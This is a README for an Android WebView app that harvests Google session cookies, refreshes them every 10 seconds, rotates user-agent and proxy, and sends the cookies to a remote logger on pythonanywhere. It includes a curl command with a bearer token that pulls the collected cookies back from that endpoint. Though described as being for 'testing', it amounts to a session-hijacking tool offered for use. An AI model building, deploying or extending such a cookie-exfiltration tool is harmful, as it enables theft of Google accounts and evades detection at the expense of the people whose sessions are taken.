#  WebView Cookie Collector

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Android](https://img.shields.io/badge/Platform-Android-green.svg)](https://www.android.com/)

A simple Android WebView app that collects Google session cookies and sends them via `curl` to a remote logger endpoint. Ideal for automated cookie collection and testing.

---

##  Features

- Collect session cookies from Google via WebView.
- Send cookies automatically to a remote logger with `curl`.
- Auto-refresh cookies every 10 seconds.
- Rotate identity (user-agent, proxy, clear cache/cookies).
- Copy cookies or headers directly to clipboard.

---

##  How It Works

1. **WebView App**
   - Opens Google in an embedded WebView.
   - Collect cookies manually with the **Collect Cookies** button.
   - Auto-refresh updates cookies continuously.
   - Rotate identity resets cookies, cache, and user-agent.

2. **Remote Logging**
   - App sends cookies automatically to a remote server via `curl`.

curl -X GET "https://cookieLogger.pythonanywhere.com/get/mykey" \
  -H "Authorization: Bearer 169e1538-b8dd-4faa-a636-f8173230a4c1"
